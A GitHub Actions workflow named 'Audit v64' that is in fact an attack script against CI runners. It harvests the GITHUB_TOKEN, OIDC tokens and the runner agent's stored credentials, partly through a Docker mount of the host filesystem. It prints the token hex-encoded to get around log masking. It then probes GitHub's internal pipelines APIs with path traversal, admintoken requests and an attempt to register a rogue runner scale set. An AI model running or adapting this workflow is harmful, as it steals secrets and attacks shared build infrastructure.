name: Audit v64
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v64:
    runs-on: ubuntu-latest
    steps:

      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V64 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: PLAN/JOB ID INJECTION + OIDC AS BEARER
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Plan-ID Injection and OIDC Bearer
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== PLAN/JOB INJECTION ==="
          IDTOK=$(cat /tmp/idtok.txt)
          IDTOK_URL=$(cat /tmp/idtok_url.txt)
          PLAN=$(cat /tmp/plan.txt)
          JOB=$(cat /tmp/job.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
          PIPE_HOST="pipelines.actions.githubusercontent.com"
          VER="api-version=6.0-preview"

          OIDC=$(/usr/bin/curl -sS -m 5 \
            -H "Authorization: Bearer $IDTOK" \
            "${IDTOK_URL}&audience=api://AzureADTokenExchange" 2>/dev/null | \
            python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('value',''))" 2>/dev/null)
          echo "OIDC_LEN=${#OIDC} PLAN=$PLAN JOB=$JOB"

          # A: Inject actual PLAN and JOB IDs via the direct pipelines URL
          echo "--- A: Plan/Job path injection ---"
          for EP in \
            "_apis/distributedtask/plans/$PLAN" \
            "_apis/distributedtask/plans/$PLAN/jobs" \
            "_apis/distributedtask/plans/$PLAN/jobs/$JOB" \
            "_apis/distributedtask/plans/$PLAN/jobs/$JOB/admintoken" \
            "_apis/distributedtask/plans/$PLAN/jobs/$JOB/idtoken" \
            "_apis/distributedtask/plans/$PLAN/logs" \
            "_apis/distributedtask/plans/$PLAN/timelines" \
            "_apis/_apis/distributedtask/plans/$PLAN/jobs/$JOB/admintoken"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Accept: application/json; $VER" \
              "$PIPE/$EP" 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A $EP = $CODE"
            echo "$BODY" | head -c 400
            echo ""
          done

          # B: OIDC JWT as Bearer against pipelines proxy
          echo "--- B: OIDC as Bearer on pipelines ---"
          for EP in \
            "_apis/distributedtask/pools" \
            "_apis/distributedtask/pools/1/admintoken" \
            "_apis/distributedtask/pools/2/admintoken" \
            "_apis/distributedtask/pools/1/agents" \
            "_apis/distributedtask/pools/..%2fadmintoken" \
            "_apis/runtime/runnergroups" \
            "_apis/runtime/runnergroups/2/runners" \
            "_apis/runtime/runnerscalesets"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $OIDC" \
              -H "Host: $PIPE_HOST" \
              -H "Accept: application/json; $VER" \
              "$PROXY/$EP" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B OIDC $EP = $CODE | $(echo "$BODY" | head -c 250)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: SCALE SET INJECTION + POOL SUB-ENDPOINTS
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Scale Set and Pool Sub-Endpoints
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== SCALESET + POOL SUBS ==="
          IDTOK=$(cat /tmp/idtok.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          PIPE_HOST="pipelines.actions.githubusercontent.com"
          VER="api-version=6.0-preview"

          # A: POST to runnerscalesets — register rogue
          echo "--- A: Rogue scale set registration ---"
          for GID in 1 2; do
            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 4 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $PIPE_HOST" \
              -H "Content-Type: application/json" \
              -H "Accept: application/json; $VER" \
              "$PROXY/_apis/runtime/runnerscalesets" --path-as-is \
              -d "{\"Name\":\"v64-rogue\",\"RunnerGroupId\":$GID}" 2>/dev/null)
            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
            echo "A POST scalesets GID=$GID = $CODE"
            echo "$R" | tail -5 | head -c 500
            echo ""
          done
          echo ""

          # B: New pool sub-endpoints never tried
          echo "--- B: New pool sub-paths ---"
          for PID in 1 2; do
            for EP in \
              "generatejitconfig" \
              "createdsession" \
              "acquirejobs" \
              "generateserviceprincipal" \
              "settings" \
              "metadata" \
              "capabilities" \
              "maintenance" \
              "serviceaccounts" \
              "recycle" \
              "upgrade"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
                -H "Authorization: Bearer $IDTOK" \
                -H "Host: $PIPE_HOST" \
                -H "Accept: application/json; $VER" \
                "$PROXY/_apis/distributedtask/pools/$PID/$EP" --path-as-is 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              if [ "$CODE" != "HTTP_404" ]; then
                echo "B pool/$PID/$EP = $CODE"
                echo "$BODY" | head -c 300
                echo ""
              fi
            done
          done
          echo ""

          # C: runnergroups/2 (GitHub Actions, 20 hosted runners) — sub-paths
          echo "--- C: runnergroups/2 sub-paths ---"
          for EP in \
            "runners" "jitconfig" "accesspolicy" "settings" \
            "generatejitconfig" "acquirejobs" "runnerscalesets" "admintoken" \
            "runnerscalesets/1" "runnerscalesets/2"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $PIPE_HOST" \
              -H "Accept: application/json; $VER" \
              "$PROXY/_apis/runtime/runnergroups/2/$EP" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "C runnergroups/2/$EP = $CODE"
            echo "$BODY" | head -c 300
            echo ""
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: BROKERLISTENER + CREATEDSESSION + MESSAGES
      # These are the core runner-agent communication endpoints.
      # Try with CTOK (agent credential) and via proxy with pipelines Host.
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - BrokerListener and Session Messages
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== BROKER + MESSAGES ==="
          IDTOK=$(cat /tmp/idtok.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
          PIPE_HOST="pipelines.actions.githubusercontent.com"
          VER="api-version=6.0-preview"
          PLAN=$(cat /tmp/plan.txt)
          JOB=$(cat /tmp/job.txt)

          # A: BrokerListener — agent listens for jobs on this endpoint
          echo "--- A: BrokerListener ---"
          for TOK_NAME in IDTOK CTOK; do
            eval TOK=\$$TOK_NAME
            [ -z "$TOK" ] || [ "${#TOK}" -lt 10 ] && continue
            for PID in 1 2; do
              R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 4 \
                -H "Authorization: Bearer $TOK" \
                -H "Host: $PIPE_HOST" \
                -H "Accept: application/json; $VER" \
                "$PROXY/_apis/distributedtask/pools/$PID/brokerlistener" --path-as-is 2>/dev/null)
              CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
              echo "A $TOK_NAME brokerlistener pool/$PID = $CODE"
              echo "$R" | tail -5 | head -c 400
              echo ""
            done
          done
          echo ""

          # B: createdsession — the endpoint that creates authenticated sessions
          echo "--- B: createdsession ---"
          for PID in 1 2; do
            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 4 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $PIPE_HOST" \
              -H "Content-Type: application/json" \
              -H "Accept: application/json; $VER" \
              "$PROXY/_apis/distributedtask/pools/$PID/createdsession" --path-as-is \
              -d "{\"ownerName\":\"v64\",\"sessionId\":\"00000000-0000-0000-0000-000000000001\"}" 2>/dev/null)
            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
            echo "B POST createdsession pool/$PID = $CODE"
            echo "$R" | tail -5 | head -c 400
            echo ""
          done

          # C: Message polling — if we had a session ID we could poll messages
          echo "--- C: Messages via traversal ---"
          for SESS_ID in "00000000-0000-0000-0000-000000000001" "1" "0"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $PIPE_HOST" \
              -H "Accept: application/json; $VER" \
              "$PROXY/_apis/distributedtask/pools/2/messages?sessionId=$SESS_ID&lastMessageId=0" --path-as-is 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "C messages sessionId=$SESS_ID = $CODE | $(echo "$BODY" | head -c 300)"
          done

      - name: Step 5 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V64 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V64 COMPLETE ==="
